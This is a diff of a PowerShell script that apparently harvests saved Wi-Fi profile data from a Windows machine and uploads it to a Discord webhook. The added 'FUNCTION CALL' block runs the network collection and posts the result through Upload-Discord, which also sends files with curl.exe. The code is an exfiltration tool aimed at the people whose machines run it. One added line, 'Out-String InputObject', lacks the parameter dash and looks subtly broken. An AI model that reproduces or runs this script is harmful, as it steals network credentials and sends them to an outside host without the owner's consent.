@@ -34,8 +34,6 @@ Foreach($WLANProfileName in $WLANProfileNames){
 return $WLANProfileObjects
 }
 
-$Networks = Get-Networks
-
 ###################################################################################################################
 
 function Upload-Discord {
@@ -60,6 +58,12 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
+
+############### FUNCTION CALL ###############
+
+$Networks = Get-Networks
+
+$Networks = Out-String InputObject $Networks
 
 Upload-Discord -text $Networks
 
